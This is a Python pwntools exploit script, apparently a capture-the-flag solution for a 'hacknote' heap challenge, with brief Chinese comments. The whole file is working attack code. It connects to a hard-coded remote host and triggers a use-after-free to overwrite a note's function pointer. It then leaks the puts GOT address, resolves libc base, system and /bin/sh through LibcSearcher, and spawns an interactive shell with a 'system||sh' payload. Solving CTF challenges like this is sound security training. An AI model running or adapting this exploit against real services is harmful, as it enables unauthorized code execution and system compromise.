# coding:utf8
from pwn import *
from LibcSearcher import *

# sh = process('./hacknote')111.200.241.244:59137
sh = remote('111.200.241.244', 59137)
elf = ELF('./hacknote')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
show_addr = 0x804862B


def create(size, content):
    sh.sendlineafter('Your choice :', '1')
    sh.sendlineafter('Note size :', str(size))
    sh.sendafter('Content :', content)


def delete(index):
    sh.sendlineafter('Your choice :', '2')
    sh.sendlineafter('Index :', str(index))


def show(index):
    sh.sendlineafter('Your choice :', '3')
    sh.sendlineafter('Index :', str(index))


# 创建二个堆
create(0x20, 'a' * 0x20)
create(0x20, 'b' * 0x20)
delete(0)
delete(1)
payload = p32(0x804862B) + p32(puts_got)
# 这个8字节空间正好分配到了note0的结构体处
create(0x8, payload)

# 泄露puts的加载地址
show(0)
# 获得puts的加载地址
puts_addr = u32(sh.recv(4))

libc = LibcSearcher('puts', puts_addr)
print(hex(puts_addr))
libc_base = puts_addr - libc.dump('puts')
print('libc base:', hex(libc_base))
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
''''' 
libc = ELF('/usr/lib/libc-2.17.so') 
libc_base = puts_addr - libc.sym['puts'] 
print 'libc base:',hex(libc_base) 
system_addr = libc_base + libc.sym['system'] 
binsh_addr = libc_base + libc.search('/bin/sh').next() 
'''

delete(2)
payload = p32(system_addr) + '||sh'
create(0x8, payload)
# get shell  
show(0)

sh.interactive()
